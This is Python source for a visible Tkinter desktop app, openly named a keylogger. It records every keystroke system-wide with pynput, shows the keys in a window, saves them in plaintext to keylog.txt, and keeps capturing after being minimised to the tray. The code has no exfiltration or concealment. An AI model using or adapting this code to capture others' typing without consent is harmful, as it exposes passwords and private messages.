import tkinter as tk
from tkinter import scrolledtext, messagebox
from pynput import keyboard
import pystray
from PIL import Image, ImageDraw
import threading
import os


class KeyloggerGUI:
    def __init__(self, root):
        self.root = root
        self.root.title("🔐 Simple Keylogger")
        self.root.geometry("600x400")
        self.log_file = "keylog.txt"
        self.listener = None
        self.is_dark = False
        self.pressed_keys = set()  # ✅ Initialize here to track key presses

        # Build GUI
        self.create_widgets()
        self.setup_styles()
        self.apply_theme()

    def create_widgets(self):
        # Title
        self.title_label = tk.Label(self.root, text="🛡️ Keyboard Tracker", font=("Helvetica", 16, "bold"))
        self.title_label.pack(pady=10)

        # Text Area
        self.text_area = scrolledtext.ScrolledText(
            self.root, width=70, height=15,
            font=("Consolas", 10),
            insertbackground="black"
        )
        self.text_area.pack(padx=10, pady=10)

        # Button Frame
        self.button_frame = tk.Frame(self.root)
        self.button_frame.pack(pady=10)

        self.start_button = tk.Button(self.button_frame, text="▶ Start Logging", command=self.start_logging, width=15)
        self.start_button.grid(row=0, column=0, padx=5)

        self.stop_button = tk.Button(self.button_frame, text="⏹ Stop Logging", command=self.stop_logging, width=15, state=tk.DISABLED)
        self.stop_button.grid(row=0, column=1, padx=5)

        self.clear_button = tk.Button(self.button_frame, text="🧹 Clear Log", command=self.clear_log, width=15)
        self.clear_button.grid(row=0, column=2, padx=5)

        self.toggle_button = tk.Button(self.button_frame, text="🌙 Toggle Dark Mode", command=self.toggle_theme, width=18)
        self.toggle_button.grid(row=0, column=3, padx=5)

        # Bind close
        self.root.protocol("WM_DELETE_WINDOW", self.minimize_to_tray)

    def setup_styles(self):
        # Light theme
        self.light = {
            "bg": "#f7f0f0",
            "fg": "#000000",
            "textarea_bg": "#ffffff",
            "textarea_fg": "#000000"
        }

        # Dark theme
        self.dark = {
            "bg": "#1e1e1e",
            "fg": "#ffffff",
            "textarea_bg": "#2e2e2e",
            "textarea_fg": "#ffffff"
        }

    def apply_theme(self):
        theme = self.dark if self.is_dark else self.light
        self.root.configure(bg=theme["bg"])
        self.title_label.configure(bg=theme["bg"], fg=theme["fg"])
        self.text_area.configure(bg=theme["textarea_bg"], fg=theme["textarea_fg"])
        self.button_frame.configure(bg=theme["bg"])

    def toggle_theme(self):
        self.is_dark = not self.is_dark
        self.apply_theme()

    def on_press(self, key):
        if key in self.pressed_keys:
            return  # ⛔ Already logged this key press
        self.pressed_keys.add(key)

        try:
            if hasattr(key, 'char') and key.char is not None:
                k = key.char
            else:
                k = f"[{key.name if hasattr(key, 'name') else key}]"
        except:
            k = f"[{key}]"

        self.text_area.insert(tk.END, k)
        self.text_area.see(tk.END)

        with open(self.log_file, "a", encoding="utf-8") as f:
            f.write(k)

    def on_release(self, key):
        if key in self.pressed_keys:
            self.pressed_keys.remove(key)

    def start_logging(self):
        self.listener = keyboard.Listener(on_press=self.on_press, on_release=self.on_release)
        self.listener.start()
        self.start_button.config(state=tk.DISABLED)
        self.stop_button.config(state=tk.NORMAL)

    def stop_logging(self):
        if self.listener:
            self.listener.stop()
            self.listener = None
        self.start_button.config(state=tk.NORMAL)
        self.stop_button.config(state=tk.DISABLED)

    def clear_log(self):
        self.text_area.delete(1.0, tk.END)
        open(self.log_file, "w").close()

    def minimize_to_tray(self):
        self.root.withdraw()
        icon_image = self.create_icon()
        self.tray_icon = pystray.Icon("Simple Keylogger", icon_image, "Keylogger Running", menu=pystray.Menu(
            pystray.MenuItem("Show", self.show_window),
            pystray.MenuItem("Quit", self.quit_app)
        ))
        threading.Thread(target=self.tray_icon.run, daemon=True).start()

    def create_icon(self):
        image = Image.new("RGB", (64, 64), "black")
        draw = ImageDraw.Draw(image)
        draw.rectangle((16, 16, 48, 48), fill="white")
        return image

    def show_window(self):
        self.tray_icon.stop()
        self.root.after(0, self.root.deiconify)

    def quit_app(self):
        if self.listener:
            self.listener.stop()
        self.tray_icon.stop()
        self.root.destroy()


if __name__ == "__main__":
    root = tk.Tk()
    app = KeyloggerGUI(root)
    root.mainloop()
